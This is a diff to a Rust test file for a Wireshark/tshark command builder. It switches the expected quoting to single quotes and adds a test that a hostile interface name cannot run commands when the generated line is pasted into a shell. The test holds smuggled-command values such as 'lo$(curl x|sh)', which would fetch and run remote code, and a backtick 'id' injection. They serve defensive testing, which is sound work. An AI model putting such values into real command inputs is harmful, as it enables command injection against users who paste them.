@@ -31,7 +31,7 @@ fn http_server_on_loopback_gets_loopback_interface_port_filters_and_decode_as() 
     assert_eq!(plan.decode_as.as_deref(), Some("tcp.port==8080,http"));
     assert_eq!(
         plan.wireshark_command().unwrap(),
-        "wireshark -k -i lo0 -f \"tcp port 8080\" -Y \"tcp.port == 8080 && http\" -d tcp.port==8080,http"
+        "wireshark -k -i lo0 -f 'tcp port 8080' -Y 'tcp.port == 8080 && http' -d tcp.port==8080,http"
     );
     assert!(plan
         .tshark_command()
@@ -479,4 +479,36 @@ fn eapol_and_ndp_filter_below_the_transport() {
         assert_eq!(plan.display_filter, display, "{name}");
         assert_eq!(plan.decode_as, None, "{name} needs no decode-as clause");
     }
+}
+
+/// The interface name is a startup parameter the model or an MCP client can set, and the
+/// line is pasted into a terminal. Double quotes left `$(…)` and backticks live; a
+/// single-quoted word has no metacharacters.
+#[cfg(not(windows))]
+#[test]
+fn a_hostile_interface_name_cannot_run_anything_when_the_line_is_pasted() {
+    use netget::tui::wireshark::shell_word;
+    assert_eq!(shell_word("lo0"), "lo0", "plain stays bare");
+    assert_eq!(shell_word("tcp port 8080"), "'tcp port 8080'");
+    assert_eq!(shell_word("lo$(curl x|sh)"), "'lo$(curl x|sh)'");
+    assert_eq!(shell_word("lo`id`"), "'lo`id`'");
+    assert_eq!(shell_word("a\\b\"c"), "'a\\b\"c'");
+    assert_eq!(
+        shell_word("it's"),
+        "'it'\\''s'",
+        "an embedded quote closes, escapes, reopens"
+    );
+    assert_eq!(shell_word("x\ny"), "<value-contains-control-characters>");
+
+    let mut target = server("ICMP", "", 0);
+    target.interface = Some("lo$(curl x|sh)".into());
+    let plan = CapturePlan::build(target, Platform::Linux);
+    let line = plan
+        .tshark_command()
+        .expect("a raw protocol gets a command");
+    assert!(line.contains("-i 'lo$(curl x|sh)'"), "{line}");
+    assert!(
+        !line.contains("-i lo$(") && !line.contains("\"lo$("),
+        "{line}"
+    );
 }
